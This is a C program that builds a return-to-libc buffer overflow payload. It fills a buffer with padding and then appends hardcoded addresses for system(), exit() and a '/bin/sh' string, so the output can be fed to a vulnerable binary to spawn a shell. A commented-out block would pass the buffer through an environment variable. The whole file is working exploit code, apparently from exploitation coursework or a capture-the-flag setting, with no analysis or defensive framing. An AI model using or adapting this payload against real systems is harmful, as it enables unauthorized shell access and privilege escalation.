#include <stdlib.h>
#include <stdio.h>
#include <string.h>


#define buffer_size 512
#define NOP         0x90

#define SYSTEMADDR 0xf7e46190
#define EXITADDR   0xf7e391e0
#define BINSHADDR  0xf7f66a24

char shellcode[] =
  "\x90\x61\xe4\xf7" /* system() */
  "\xe0\x91\xe3\xf7" /* exit() */
  "\x24\x6a\xf6\xf7";/* binsh */


int main(int argc, char *argv[])
{
  char *buff, *ptr;
  long *addr_ptr; /*, addr;*/
  int bsize=buffer_size;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);

  if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
  }

  /* initialize buffer with garbage */
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
       *(addr_ptr++) = 0x41464146;

  /* add shellcode to buffer end */
  ptr = buff + bsize - strlen(shellcode) -1;
  for (i = 0; i < strlen(shellcode); i++)
         *(ptr++) = shellcode[i];
  buff[bsize - 1] = '\0';

  /* open shell with BUF environment variable */
/*  memcpy(buff,"BUF=",4);
  putenv(buff);
  system("/bin/bash");*/
  fwrite(buff+4, bsize-4, 1, stdout);

  return 0;
}
